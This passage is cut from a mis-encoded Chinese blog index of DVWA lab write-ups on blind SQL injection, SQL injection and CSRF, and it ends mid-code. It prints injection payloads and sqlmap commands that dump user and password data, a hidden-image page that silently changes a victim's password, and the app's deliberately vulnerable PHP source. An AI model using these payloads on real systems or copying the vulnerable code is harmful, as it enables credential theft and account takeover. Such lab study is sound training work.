æ²¡æœ‰ä»€ä¹ˆå·®åˆ«ã€‚","tags":[{"name":"DVWA-labs","slug":"DVWA-labs","permalink":"http://example.com/tags/DVWA-labs/"}]},{"title":"DVWAâ€”SQL Injection (Blind)","date":"2021-03-10T08:48:00.000Z","path":"2021/03/10/DVWAâ€”SQL Injection (Blind)/","text":"å‰è¨€ï¼šSQLç›²æ³¨ä¸ä¸€èˆ¬SQLæ³¨å…¥çš„åŒºåˆ«åœ¨äºä¸€èˆ¬SQLæ³¨å…¥çš„æ”»å‡»è€…å¯ä»¥ç›´æ¥ä»é¡µé¢ä¸Šçœ‹åˆ°æ³¨å…¥è¯­å¥çš„æ‰§è¡Œç»“æœï¼Œè€Œç›²æ³¨æ—¶æ”»å‡»è€…é€šå¸¸æ˜¯æ— æ³•ä»æ˜¾ç¤ºé¡µé¢ä¸Šè·å–æ‰§è¡Œçš„ç»“æœï¼Œç”šè‡³è¿æ³¨å…¥è¯­å¥æ˜¯å¦æ‰§è¡Œéƒ½æ— æ³•å¾—çŸ¥ã€‚ Lowï¼š1ï¼‰åˆ¤æ–­æ³¨å…¥ç‚¹å³å…¶ç±»å‹ 1â€™ and â€˜1â€™=â€™1![2](DVWAâ€”SQL Injection (Blind)/2.png) 1â€™ and â€˜1â€™=â€™2![1](DVWAâ€”SQL Injection (Blind)/1.png) å¯çŸ¥å­˜åœ¨æ³¨å…¥ç‚¹ï¼Œä¸”æ³¨å…¥ç±»å‹ä¸º&#39; 2ï¼‰çŒœæµ‹SQLæŸ¥è¯¢è¯­å¥çš„å­—æ®µæ•° 1â€™ order by 2#![2](DVWAâ€”SQL Injection (Blind)/2.png) 1â€™ order by 3#![1](DVWAâ€”SQL Injection (Blind)/1.png) 3ï¼‰çˆ†åº“ 1â€™ and length(database())=1 # ï¼Œä¸å­˜åœ¨ 1â€™ and length(database())=2 # ï¼Œä¸å­˜åœ¨ 1â€™ and length(database())=3 # ï¼Œä¸å­˜åœ¨ 1â€™ and length(database())=4 # ï¼Œå­˜åœ¨ï¼Œå› æ­¤åº“åé•¿åº¦ä¸ºå›› 1â€™ and left(database(),1)=â€™dâ€™#ï¼Œå­˜åœ¨ï¼Œä¸€æ¬¡åº“åçš„é¦–å­—æ¯ä¸ºdï¼Œå‰©ä¸‹çš„ä¸€æ¬¡ç±»æ¨ï¼Œå¾—åº“åä¸ºdvwa 4ï¼‰çˆ†è¡¨ å…ˆçŒœè¡¨ä¸ªæ•° 1â€™ and (select count(table_name) from information_schema.tables where table_schema=database())=2 #ï¼Œå­˜åœ¨ï¼Œå³æœ‰ä¸¤ä¸ªè¡¨ çŒœè¡¨åé•¿åº¦ 1â€™ and length(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1))=9 #ï¼Œå­˜åœ¨ï¼Œç¬¬ä¸€ä¸ªè¡¨åæœ‰9ä¸ªå­—æ¯ 1â€™ and length(substr((select table_name from information_schema.tables where table_schema=database() limit 1,1),1))=5 # å­˜åœ¨ï¼Œç¬¬äºŒä¸ªè¡¨åæœ‰5ä¸ªå­—æ¯ çŒœè¡¨åç»„æˆå­—ç¬¦ 1â€™ and substr((select table_name from information_schema.tables where table_schema=database() limit 1,1),1,1)=â€™uâ€™ #ï¼Œå­˜åœ¨ï¼Œè¯´æ˜ç¬¬äºŒä¸ªè¡¨çš„è¡¨åé¦–å­—æ¯ä¸ºuï¼Œä»¥æ­¤ç±»æ¨å¯å¾—ç¬¬äºŒä¸ªè¡¨è¡¨åä¸ºusers 5ï¼‰çˆ†åˆ— çˆ†åˆ—å’Œçˆ†è¡¨åŸºæœ¬ç›¸ä¼¼ï¼Œä»…éœ€ç¨å¾®ä¿®æ”¹ä¸€ç‚¹å³å¯ï¼Œä¸‹é¢å°±ä¸¾çŒœè¡¨ä¸ªæ•°ä¸ºä¾‹ï¼Œå…¶ä½™è‡ªè¡Œå˜é€šã€‚ 1â€™ and (select count(column_name) from information_schema.columns where table_name=â€™usersâ€™)=14 #ï¼Œå­˜åœ¨ï¼Œè¯´æ˜æœ‰14ä¸ªåˆ— 6ï¼‰çˆ†å€¼ çˆ†å€¼æ‰‹åŠ¨æ“ä½œé‡å¤ªå¤§äº†ï¼Œè¿™é‡Œå°±ä»¥çˆ†åˆ—ï¼šuserä¸ºä¾‹ 1â€™ and substr((select user from users limit 0,1),1,1)=â€™aâ€™# æŸ¥çœ‹æºç ï¼š 12345678910111213141516171819202122232425262728?phpif( isset( $_GET[ &#x27;Submit&#x27; ] ) ) &#123; // Get input $id = $_GET[ &#x27;id&#x27; ]; // Check database $getid = &quot;SELECT first_name, last_name FROM users WHERE user_id = &#x27;$id&#x27;;&quot;; $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;], $getid ); // Removed &#x27;or die&#x27; to suppress mysql errors // Get results $num = @mysqli_num_rows( $result ); // The &#x27;@&#x27; character suppresses errors if( $num &gt; 0 ) &#123; // Feedback for end user echo &#x27;&lt;pre&gt;User ID exists in the database.&lt;/pre&gt;&#x27;; &#125; else &#123; // User wasn&#x27;t found, so the page wasn&#x27;t! header( $_SERVER[ &#x27;SERVER_PROTOCOL&#x27; ] . &#x27; 404 Not Found&#x27; ); // Feedback for end user echo &#x27;&lt;pre&gt;User ID is MISSING from the database.&lt;/pre&gt;&#x27;; &#125; ((is_null($___mysqli_res = mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]))) ? false : $___mysqli_res);&#125;?&gt; Mediumï¼šæŸ¥çœ‹æºç ï¼š 1234567891011121314151617181920212223242526&lt;?phpif( isset( $_POST[ &#x27;Submit&#x27; ] ) ) &#123; // Get input $id = $_POST[ &#x27;id&#x27; ]; $id = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $id ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;)); // Check database $getid = &quot;SELECT first_name, last_name FROM users WHERE user_id = $id;&quot;; $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;], $getid ); // Removed &#x27;or die&#x27; to suppress mysql errors // Get results $num = @mysqli_num_rows( $result ); // The &#x27;@&#x27; character suppresses errors if( $num &gt; 0 ) &#123; // Feedback for end user echo &#x27;&lt;pre&gt;User ID exists in the database.&lt;/pre&gt;&#x27;; &#125; else &#123; // Feedback for end user echo &#x27;&lt;pre&gt;User ID is MISSING from the database.&lt;/pre&gt;&#x27;; &#125; //mysql_close();&#125;?&gt; è¿˜æ˜¯æŠ“åŒ…ï¼Œç„¶åä¿®æ”¹ä¸Šä¼ æ•°æ®ï¼Œå¤§ä½“åŒSQL Injection ï¼ˆMediumï¼‰ Highï¼šæŸ¥çœ‹æºç ï¼š 12345678910111213141516171819202122232425262728293031323334 &lt;?phpif( isset( $_COOKIE[ &#x27;id&#x27; ] ) ) &#123; // Get input $id = $_COOKIE[ &#x27;id&#x27; ]; // Check database $getid = &quot;SELECT first_name, last_name FROM users WHERE user_id = &#x27;$id&#x27; LIMIT 1;&quot;; $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;], $getid ); // Removed &#x27;or die&#x27; to suppress mysql errors // Get results $num = @mysqli_num_rows( $result ); // The &#x27;@&#x27; character suppresses errors if( $num &gt; 0 ) &#123; // Feedback for end user echo &#x27;&lt;pre&gt;User ID exists in the database.&lt;/pre&gt;&#x27;; &#125; else &#123; // Might sleep a random amount if( rand( 0, 5 ) == 3 ) &#123; sleep( rand( 2, 4 ) ); &#125; // User wasn&#x27;t found, so the page wasn&#x27;t! header( $_SERVER[ &#x27;SERVER_PROTOCOL&#x27; ] . &#x27; 404 Not Found&#x27; ); // Feedback for end user echo &#x27;&lt;pre&gt;User ID is MISSING from the database.&lt;/pre&gt;&#x27;; &#125; ((is_null($___mysqli_res = mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]))) ? false : $___mysqli_res);&#125;?&gt; æˆ‘ä»¬å¯ä»¥çœ‹åˆ°å½“SQLè¯­å¥æŸ¥è¯¢ä¸ºç©ºçš„æ—¶å€™ï¼Œä¼šéšæœºæ‰§è¡Œsleep()å‡½æ•°ï¼Œå¹¶éšæœºå»¶è¿Ÿ2~4ç§’ï¼Œé‚£ä¹ˆç”¨æ—¶é—´ç›²æ³¨å°±å¯èƒ½è¢«å½±å“ï¼Œå› æ­¤è¿™å…³ç”¨å¸ƒå°”ç›²æ³¨ã€‚å…·ä½“åŒLowçº§åˆ«ä¸€æ ·ã€‚","tags":[{"name":"DVWA-labs","slug":"DVWA-labs","permalink":"http://example.com/tags/DVWA-labs/"}]},{"title":"DVWAâ€”SQL Injection","date":"2021-03-09T13:20:45.370Z","path":"2021/03/09/DVWAâ€”SQL Injection/","text":"å‰è¨€ï¼šä¹‹å‰æœ‰åˆ·è¿‡sqlilabsï¼Œå‰è¨€å°±ä¸å†ä»‹ç»äº†ã€‚ Lowï¼šæ‰‹å·¥æ³¨å…¥ï¼š1ï¼‰åˆ¤æ–­æ˜¯å¦å­˜åœ¨æ³¨å…¥ç‚¹ï¼Œæ³¨å…¥ç‚¹æ˜¯å­—ç¬¦å‹è¿˜æ˜¯æ•°å­—å‹ 1â€™ and â€˜1â€™=â€™1ï¼ŒæˆåŠŸ 1â€™ and â€˜1â€™=â€™2ï¼Œè¿”å›ç»“æœä¸ºç©ºï¼Œå­˜åœ¨è¯´æ˜å­˜åœ¨æ³¨å…¥ç‚¹ä¸”ä¸º&#39; 2ï¼‰çŒœè§£SQLæŸ¥è¯¢è¯­å¥ä¸­çš„å­—æ®µæ•° 1â€™ order by 1#ä¸æŠ¥é”™ï¼› 1â€™ order by 2#ä¸æŠ¥é”™ï¼› 1â€™ order by 3#æŠ¥é”™ï¼Œè¯´æ˜SQLæŸ¥è¯¢è¯­å¥ä¸­åªæœ‰ä¸¤ä¸ªå­—æ®µï¼Œå³è¿™é‡Œçš„First nameã€Surnameã€‚ 3ï¼‰åˆ¤æ–­å›æ˜¾ä½ 0â€™ union select 1,2#![1](DVWAâ€”SQL Injection/1.png) æœ‰ä¸¤ä¸ªå›æ˜¾ä½ã€‚ 4ï¼‰çˆ†åº“ 0â€™ union select 1,database()#![2](DVWAâ€”SQL Injection/2.png) 5ï¼‰çˆ†è¡¨ 0â€™ union select 1,group_concat(table_name) from information_schema.tables where table_schema=database()#![3](DVWAâ€”SQL Injection/3.png) 6ï¼‰çˆ†åˆ— 0â€™ union select 1,group_concat(column_name) from information_schema.columns where table_name=â€™usersâ€™# ![4](DVWAâ€”SQL Injection/4.png) 7ï¼‰çˆ†å€¼ 0â€™ union select user,password from users# ![5](DVWAâ€”SQL Injection/5.png) æˆ–0â€™ union select 1,group_concat(user,0x3a,password) from users# ![6](DVWAâ€”SQL Injection/6.png) åˆ©ç”¨sqlmapè‡ªåŠ¨æ³¨å…¥ï¼š1ï¼‰è·å–æ‰€æœ‰æ•°æ®åº“ sqlmap.py -u â€œurlâ€ â€“cookie â€œcookieä¸­çš„å†…å®¹â€ â€“dbs spï¼š -u ï¼š æŒ‡å®šurlæ‰«æ,ä½†urlå¿…é¡»å­˜åœ¨æŸ¥è¯¢å‚æ•°. ä¾‹: xxx.php?id=1 â€‹ â€“dbsï¼šè·å–æ‰€æœ‰æ•°æ®åº“ 2ï¼‰æŸ¥è¯¢å½“å‰æ•°æ®åº“å sqlmap.py -u â€œurlâ€ â€“cookie â€œcookieä¸­çš„å†…å®¹â€ â€“current-db spï¼š â€“current-dbï¼šæŸ¥è¯¢å½“å‰æ•°æ®åº“æ˜µç§° 3ï¼‰æŸ¥è¡¨å sqlmap.py -u â€œurlâ€ â€“cookie=â€cookieä¸­çš„å†…å®¹â€ â€“batch -D dvwa â€“tables spï¼š-Dï¼šæŒ‡å®šæ•°æ®åº“ â€“tableï¼šæŸ¥è¯¢æ‰€æœ‰è¡¨ â€‹ â€“batchï¼šæ‰¹å¤„ç†,ä¹Ÿå°±æ˜¯ç³»ç»Ÿé»˜è®¤é€‰é¡¹(æŒ‰ç…§é»˜è®¤çš„é€‰é¡¹ å…¨è‡ªåŠ¨æ‰§è¡Œ) 4ï¼‰æŸ¥åˆ—å sqlmap.py -u â€œurlâ€ â€“cookie=â€cookieä¸­çš„å†…å®¹â€ â€“batch -D dvwa -T users â€“columns spï¼š-Tï¼šæŒ‡å®šè¡¨å â€‹ â€“columnsï¼šæŸ¥è¯¢æ‰€æœ‰åˆ— 5ï¼‰æŸ¥å€¼ sqlmap.py -u â€œurlâ€ â€“cookie=â€cookieä¸­çš„å†…å®¹â€ â€“batch -D dvwa -C user,password â€“dump spï¼š-Cï¼šæŒ‡å®šcolumns å¦‚æœä¸æŒ‡å®š,é»˜è®¤æ•´è¡¨ æŸ¥çœ‹æºç ï¼š 1234567891011121314151617&lt;?php if( isset( $_REQUEST[ &#x27;Submit&#x27; ] ) ) &#123; // Get input $id = $_REQUEST[ &#x27;id&#x27; ]; // Check database $query = &quot;SELECT first_name, last_name FROM users WHERE user_id = &#x27;$id&#x27;;&quot;; $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;], $query ) or die( &#x27;&lt;pre&gt;&#x27; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &#x27;&lt;/pre&gt;&#x27; ); // Get results while( $row = mysqli_fetch_assoc( $result ) ) &#123; // Get values $first = $row[&quot;first_name&quot;]; $last = $row[&quot;last_name&quot;]; // Feedback for end user echo &quot;&lt;pre&gt;ID: &#123;$id&#125;&lt;br /&gt;First name: &#123;$first&#125;&lt;br /&gt;Surname: &#123;$last&#125;&lt;/pre&gt;&quot;; &#125; mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]); &#125; ?&gt; Mediumï¼šæŸ¥çœ‹æºç ï¼š 12345678910111213141516171819202122232425262728293031323334&lt;?php if( isset( $_POST[ &#x27;Submit&#x27; ] ) ) &#123; //Get input* $id = $_POST[ &#x27;id&#x27; ]; $id = mysql_real_escape_string( $id ); $query = &quot;SELECT first_name, last_name FROM users WHERE user_id = $id;&quot;; $result = mysql_query( $query ) or die( &#x27;&lt;pre&gt;&#x27; . mysql_error() . &#x27;&lt;/pre&gt;&#x27; ); //Get results while( $row = mysqli_fetch_assoc( $result ) ) &#123; //Display values $first = $row[&quot;first_name&quot;]; $last = $row[&quot;last_name&quot;]; // Feedback for end user echo &quot;&lt;pre&gt;ID: &#123;$id&#125;&lt;br /&gt;First name: &#123;$first&#125;&lt;br /&gt;Surname: &#123;$last&#125;&lt;/pre&gt;&quot;; &#125;&#125;// This is used later on in the index.php page// Setting it here so we can close the database connection in here like in the rest of the source scripts$query = &quot;SELECT COUNT(*) FROM users;&quot;;$result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;], $query ) or die( &#x27;&lt;pre&gt;&#x27; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &#x27;&lt;/pre&gt;&#x27; );$number_of_rows = mysqli_fetch_row( $result )[0];mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]);?&gt; æˆ‘ä»¬å¯ä»¥çœ‹åˆ°æœåŠ¡å™¨ä½¿ç”¨mysql_real_escape_string()å‡½æ•°è¿‡æ»¤äº†ä¸€äº›å­—ç¬¦ï¼ˆå…¶ä¸­åŒ…æ‹¬åæ–œæ ï¼Œå•åŒå¼•å·ï¼‰ï¼ŒåŒæ—¶ç½‘é¡µç«¯é€‰æ‹©äº†ä¸‹æ‹‰é€‰æ‹©èœå•é™åˆ¶æˆ‘ä»¬è¾“å…¥ã€‚ä½†æ˜¯æˆ‘ä»¬çœ‹åˆ°æœ¬å…³çš„æ³¨å…¥ç‚¹ä¸ºæ•°å­—å‹ï¼Œé‚£ä¹ˆæˆ‘ä»¬å¯ä»¥åˆ©ç”¨æŠ“åŒ…çš„æ–¹å¼ä¿®æ”¹ä¸Šä¼ æ•°æ®ã€‚![7](DVWAâ€”SQL Injection/7.png) Highï¼šæŸ¥çœ‹æºç ï¼š 123456789101112131415161718192021222324&lt;?phpif( isset( $_SESSION [ &#x27;id&#x27; ] ) ) &#123; // Get input $id = $_SESSION[ &#x27;id&#x27; ]; // Check database $query = &quot;SELECT first_name, last_name FROM users WHERE user_id = &#x27;$id&#x27; LIMIT 1;&quot;; $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;], $query ) or die( &#x27;&lt;pre&gt;Something went wrong.&lt;/pre&gt;&#x27; ); // Get results while( $row = mysqli_fetch_assoc( $result ) ) &#123; // Get values $first = $row[&quot;first_name&quot;]; $last = $row[&quot;last_name&quot;]; // Feedback for end user echo &quot;&lt;pre&gt;ID: &#123;$id&#125;&lt;br /&gt;First name: &#123;$first&#125;&lt;br /&gt;Surname: &#123;$last&#125;&lt;/pre&gt;&quot;; &#125; ((is_null($___mysqli_res = mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]))) ? false : $___mysqli_res); &#125;?&gt; æˆ‘ä»¬æ³¨æ„åˆ°è¿™å…³çš„æ•°æ®æäº¤é¡µé¢å’ŒæŸ¥è¯¢ç»“æœè¿”å›é¡µé¢ä¸æ˜¯åŒä¸€ä¸ªé¡µé¢ ![8](DVWAâ€”SQL Injection/8.png) ä½†æ˜¯è¿™å…³å¦‚æœç”¨æ‰‹å·¥æ³¨å…¥çš„è¯ï¼Œéš¾åº¦å’ŒLowçº§åˆ«æ˜¯ä¸€æ ·çš„ï¼Œé‚£ä¹ˆè¿™å…³é’ˆå¯¹é˜²å¾¡çš„æ˜¯ä¸€èˆ¬çš„sqlmapæ³¨å…¥ï¼Œå› ä¸ºsqlmapåœ¨æ³¨å…¥è¿‡ç¨‹ä¸­ï¼Œæ— æ³•åœ¨æ•°æ®æäº¤é¡µé¢ä¸Šè·å–æŸ¥è¯¢çš„ç»“æœï¼Œæ²¡æœ‰äº†åé¦ˆï¼Œä¹Ÿå°±æ²¡åŠæ³•è¿›ä¸€æ­¥æ³¨å…¥ã€‚ Impossibleï¼šæŸ¥çœ‹æºç ï¼š 123456789101112131415161718192021222324252627282930313233&lt;?phpif( isset( $_GET[ &#x27;Submit&#x27; ] ) ) &#123; // Check Anti-CSRF token checkToken( $_REQUEST[ &#x27;user_token&#x27; ], $_SESSION[ &#x27;session_token&#x27; ], &#x27;index.php&#x27; ); // Get input $id = $_GET[ &#x27;id&#x27; ]; // Was a number entered? if(is_numeric( $id )) &#123; // Check the database $data = $db-&gt;prepare( &#x27;SELECT first_name, last_name FROM users WHERE user_id = (:id) LIMIT 1;&#x27; ); $data-&gt;bindParam( &#x27;:id&#x27;, $id, PDO::PARAM_INT ); $data-&gt;execute(); $row = $data-&gt;fetch(); // Make sure only 1 result is returned if( $data-&gt;rowCount() == 1 ) &#123; // Get values $first = $row[ &#x27;first_name&#x27; ]; $last = $row[ &#x27;last_name&#x27; ]; // Feedback for end user echo &quot;&lt;pre&gt;ID: &#123;$id&#125;&lt;br /&gt;First name: &#123;$first&#125;&lt;br /&gt;Surname: &#123;$last&#125;&lt;/pre&gt;&quot;; &#125; &#125;&#125;// Generate Anti-CSRF tokengenerateSessionToken();?&gt; https://www.cnblogs.com/leezhxing/p/5282437.html","tags":[{"name":"DVWA-labs","slug":"DVWA-labs","permalink":"http://example.com/tags/DVWA-labs/"}]},{"title":"DVWAâ€”Cross Site Request Forgery (CSRF)","date":"2021-03-04T10:16:08.000Z","path":"2021/03/04/DVWAâ€”CSRF/","text":"å‰è¨€ï¼š CSRFï¼Œå…¨ç§°Cross-site request forgeryï¼Œè¯‘ä¸ºè·¨ç«™è¯·æ±‚ä¼ªé€ ï¼Œæ˜¯æŒ‡åˆ©ç”¨å—å®³è€…å°šæœªå¤±æ•ˆçš„èº«ä»½è®¤è¯ä¿¡æ¯ï¼ˆcookieã€ä¼šè¯ç­‰ï¼‰ï¼Œè¯±éª—å…¶ç‚¹å‡»æ¶æ„é“¾æ¥æˆ–è€…è®¿é—®åŒ…å«æ”»å‡»ä»£ç çš„é¡µé¢ï¼Œåœ¨å—å®³äººä¸çŸ¥æƒ…çš„æƒ…å†µä¸‹ä»¥å—å®³è€…çš„èº«ä»½å‘ï¼ˆèº«ä»½è®¤è¯ä¿¡æ¯æ‰€å¯¹åº”çš„ï¼‰æœåŠ¡å™¨å‘é€è¯·æ±‚ï¼Œä»è€Œå®Œæˆéæ³•æ“ä½œï¼ˆå¦‚è½¬è´¦ã€æ”¹å¯†ç­‰ï¼‰ã€‚CSRFä¸XSSæœ€å¤§çš„åŒºåˆ«å°±åœ¨äºï¼ŒCSRFå¹¶æ²¡æœ‰ç›—å–cookieè€Œæ˜¯ç›´æ¥åˆ©ç”¨ã€‚éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œå—å®³è€…éœ€è¦ä½¿ç”¨å«æœ‰æ•ˆcookieçš„æµè§ˆå™¨è®¿é—®æ”»å‡»è€…çš„é¡µé¢æ—¶æ‰ä¼šè§¦å‘csrfæ”»å‡»ã€‚ Low:æŸ¥çœ‹æºç ï¼š 1234567891011121314151617181920212223242526272829&lt;?phpif( isset( $_GET[ &#x27;Change&#x27; ] ) ) &#123; // Get input $pass_new = $_GET[ &#x27;password_new&#x27; ]; $pass_conf = $_GET[ &#x27;password_conf&#x27; ]; // Do the passwords match? if( $pass_new == $pass_conf ) &#123; // They do! $pass_new = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $pass_new ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;)); $pass_new = md5( $pass_new ); // Update the database $insert = &quot;UPDATE `users` SET password = &#x27;$pass_new&#x27; WHERE user = &#x27;&quot; . dvwaCurrentUser() . &quot;&#x27;;&quot;; $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;], $insert ) or die( &#x27;&lt;pre&gt;&#x27; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &#x27;&lt;/pre&gt;&#x27; ); // Feedback for the user echo &quot;&lt;pre&gt;Password Changed.&lt;/pre&gt;&quot;; &#125; else &#123; // Issue with passwords matching echo &quot;&lt;pre&gt;Passwords did not match.&lt;/pre&gt;&quot;; &#125; ((is_null($___mysqli_res = mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]))) ? false : $___mysqli_res);&#125;?&gt; æˆ‘ä»¬å¯ä»¥çœ‹åˆ°æœåŠ¡å™¨æ²¡æœ‰ä»»ä½•çš„é˜²CSRFæœºåˆ¶ã€‚é‚£ä¹ˆæˆ‘ä»¬å¯ä»¥æ„é€ 404ç½‘é¡µè¿›è¡Œè®¿é—®æ¬ºéª—ï¼Œç¼–å†™test.htmlï¼Œå†…å®¹ä¸ºï¼š 123&lt;img src=&quot;http://localhost:81/vulnerabilities/csrf/?password_new=password&amp;password_conf=password&amp;Change=Change#&quot; border=&quot;0&quot; style=&quot;display:none;&quot;/&gt;&lt;h1&gt;404&lt;/h1&gt;&lt;h2&gt;file not found.&lt;/h2&gt; å½“å—å®³è€…ç‚¹å‡»test.htmlæ—¶ï¼Œå°±ç›¸å½“äºæ”»å‡»è€…åˆ©ç”¨å—å®³è€…çš„cookieï¼ˆå³åˆ©ç”¨å—å®³è€…çš„èº«ä»½ï¼‰è¿›è¡Œäº†ä¿®æ”¹å—å®³è€…è´¦æˆ·å¯†ç è¿™æ ·ä¸€ä¸ªæ“ä½œã€‚æœåŠ¡å™¨é‚£è¾¹ä¼šè¯¯ä»¥ä¸ºæ˜¯å—å®³è€…è‡ªå·±ä¸‹è¾¾çš„æ”¹å¯†ç çš„æŒ‡ä»¤ï¼Œè€Œå—å®³è€…ä¼šä»¥ä¸ºè‡ªå·±ç‚¹åˆ°äº†ä¸€ä¸ªå¤±æ•ˆçš„urlï¼Œé¡µé¢è¿”å›404,ï¼Œä½†æ˜¯å…¶å®è¿™æ—¶å—å®³è€…çš„å¯†ç å·²ç»è¢«æ‚„æ‚„æ›´æ”¹ã€‚å¯æƒ³è€ŒçŸ¥CSRFçš„å±å®³æ€§å¤šä¹ˆå¤§ã€‚ Mediumï¼šæŸ¥çœ‹æºç ï¼š 123456789101112131415161718192021222324252627282930313233343536&lt;?phpif( isset( $_GET[ &#x27;Change&#x27; ] ) ) &#123; // Checks to see where the request came from if( stripos( $_SERVER[ &#x27;HTTP_REFERER&#x27; ] ,$_SERVER[ &#x27;SERVER_NAME&#x27; ]) !== false ) &#123; // Get input $pass_new = $_GET[ &#x27;password_new&#x27; ]; $pass_conf = $_GET[ &#x27;password_conf&#x27; ]; // Do the passwords match? if( $pass_new == $pass_conf ) &#123; // They do! $pass_new = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $pass_new ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;)); $pass_new = md5( $pass_new ); // Update the database $insert = &quot;UPDATE `users` SET password = &#x27;$pass_new&#x27; WHERE user = &#x27;&quot; . dvwaCurrentUser() . &quot;&#x27;;&quot;; $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;], $insert ) or die( &#x27;&lt;pre&gt;&#x27; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &#x27;&lt;/pre&gt;&#x27; ); // Feedback for the user echo &quot;&lt;pre&gt;Password Changed.&lt;/pre&gt;&quot;; &#125; else &#123; // Issue with passwords matching echo &quot;&lt;pre&gt;Passwords did not match.&lt;/pre&gt;&quot;; &#125; &#125; else &#123; // Didn&#x27;t come from a trusted source echo &quot;&lt;pre&gt;That request didn&#x27;t look correct.&lt;/pre&gt;&quot;; &#125; ((is_null($___mysqli_res = mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]))) ? false : $___mysqli_res);&#125;?&gt; æˆ‘ä»¬å¯ä»¥çœ‹åˆ°æœåŠ¡å™¨æ£€æŸ¥å˜é‡ HTTP_REFERERï¼ˆhttpåŒ…å¤´çš„Refererå‚æ•°çš„å€¼ï¼Œè¡¨ç¤ºæ¥æºåœ°å€ï¼‰ä¸­æ˜¯å¦åŒ…å«SERVER_NAMEï¼ˆhttpåŒ…å¤´çš„Hostå‚æ•°çš„å€¼ï¼‰ï¼Œä»¥æŠµå¾¡CSRFæ”»å‡»ã€‚ æˆ‘ä»¬å…ˆåœ¨åŸé¡µé¢ä¸Šæäº¤ä¿®æ”¹å¯†ç è¯·æ±‚ï¼ŒburpæŠ“åŒ…ï¼š å†æ¨¡æ‹ŸCSRFæ”»å‡»ï¼ŒburpæŠ“åŒ…ï¼š æˆ‘ä»¬å¯ä»¥çœ‹åˆ°å¦‚æœæŒ‰ç…§lowçº§åˆ«çš„CSRFæ”»å‡»æ˜¯è‚¯å®šä¸å¯èƒ½æ”»å‡»æˆåŠŸçš„ï¼Œå› ä¸ºå®ƒç¼ºå°‘äº†Refererçš„å€¼ã€‚å› æ­¤æˆ‘ä»¬éœ€è¦æ‰‹åŠ¨æ·»åŠ  Referer: localhost:81 High:æŸ¥çœ‹æºç ï¼š 1234567891011121314151617181920212223242526272829303132333435&lt;?phpif( isset( $_GET[ &#x27;Change&#x27; ] ) ) &#123; // Check Anti-CSRF token checkToken( $_REQUEST[ &#x27;user_token&#x27; ], $_SESSION[ &#x27;session_token&#x27; ], &#x27;index.php&#x27; ); // Get input $pass_new = $_GET[ &#x27;password_new&#x27; ]; $pass_conf = $_GET[ &#x27;password_conf&#x27; ]; // Do the passwords match? if( $pass_new == $pass_conf ) &#123; // They do! $pass_new = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $pass_new ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;)); $pass_new = md5( $pass_new ); // Update the database $insert = &quot;UPDATE `users` SET password = &#x27;$pass_new&#x27; WHERE user = &#x27;&quot; . dvwaCurrentUser() . &quot;&#x27;;&quot;; $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;], $insert ) or die( &#x27;&lt;pre&gt;&#x27; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &#x27;&lt;/pre&gt;&#x27; ); // Feedback for the user echo &quot;&lt;pre&gt;Password Changed.&lt;/pre&gt;&quot;; &#125; else &#123; // Issue with passwords matching echo &quot;&lt;pre&gt;Passwords did not match.&lt;/pre&gt;&quot;; &#125; ((is_null($___mysqli_res = mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]))) ? false : 